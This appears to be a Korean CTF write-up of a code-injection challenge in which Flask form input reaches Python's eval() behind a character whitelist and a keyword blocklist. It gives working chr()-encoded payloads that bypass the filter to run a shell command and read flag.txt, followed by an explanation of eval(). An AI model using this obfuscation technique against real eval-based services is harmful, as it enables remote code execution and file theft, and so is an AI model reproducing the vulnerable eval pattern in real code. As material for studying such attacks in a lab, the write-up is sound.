---
tier: Silver 3
topics:
  - Code Injection
solved-with: Research
---
### 문제 구조

폼에서 `fromula`를 입력 받아서 필터링 후 `eval()`로 실행
``` python
formula = request.form.get("formula", "")

if filter(formula):
    return render_template("index.html", result="Filtered")
else:
    formula = eval(formula)
    return render_template("index.html", result=formula)
```

``` python
# 대소문자, 숫자, 공백, ., (, ), + 만 허용 / system, curl, flag, subprocess, popen 은 필터링
def filter(formula):
    w_list = list(string.ascii_lowercase + string.ascii_uppercase + string.digits)
    w_list.extend([" ", ".", "(", ")", "+"])

    if re.search("(system)|(curl)|(flag)|(subprocess)|(popen)", formula, re.I):
        return True
    for c in formula:
        if c not in w_list:
            return True
```

### 분석 및 풀이

필터링을 우회하기 위해서 `chr()` 사용, `chr()`은 아스키 코드를 넣으면 문자열로 반환함. 
예: `chr(108)` = `l`

밑의 명령어를 `formula`로 보내면 `eval()`에서 실행됨. 
``` python
# eval(subprocess.run('cat flag.txt', shell=True, capture_output=True).stdout.decode())
eval(chr(115)+chr(117)+chr(98)+chr(112)+chr(114)+chr(111)+chr(99)+chr(101)+chr(115)+chr(115)+chr(46)+chr(114)+chr(117)+chr(110)+chr(40)+chr(39)+chr(99)+chr(97)+chr(116)+chr(32)+chr(102)+chr(108)+chr(97)+chr(103)+chr(46)+chr(116)+chr(120)+chr(116)+chr(39)+chr(44)+chr(32)+chr(115)+chr(104)+chr(101)+chr(108)+chr(108)+chr(61)+chr(84)+chr(114)+chr(117)+chr(101)+chr(44)+chr(32)+chr(99)+chr(97)+chr(112)+chr(116)+chr(117)+chr(114)+chr(101)+chr(95)+chr(111)+chr(117)+chr(116)+chr(112)+chr(117)+chr(116)+chr(61)+chr(84)+chr(114)+chr(117)+chr(101)+chr(41)+chr(46)+chr(115)+chr(116)+chr(100)+chr(111)+chr(117)+chr(116)+chr(46)+chr(100)+chr(101)+chr(99)+chr(111)+chr(100)+chr(101)+chr(40)+chr(41))

# open(flag.txt).readline()
open(chr(102)+chr(108)+chr(97)+chr(103)+chr(46)+chr(116)+chr(120)+chr(116)).readline()
```

### 새롭게 배운 점

#### `eval()`

문자열로 표현된 파이썬 표현식을 실제로 평가하고 결과값을 반환하는 함수 

``` python
eval("1 + 2")             # 3
eval("10 > 5")            # True
eval("len('hello')")      # 5
eval("chr(65) + chr(66)") # 'AB'

def hello():
    print("Hello")
    return 123

result = eval("hello()") # 123
```

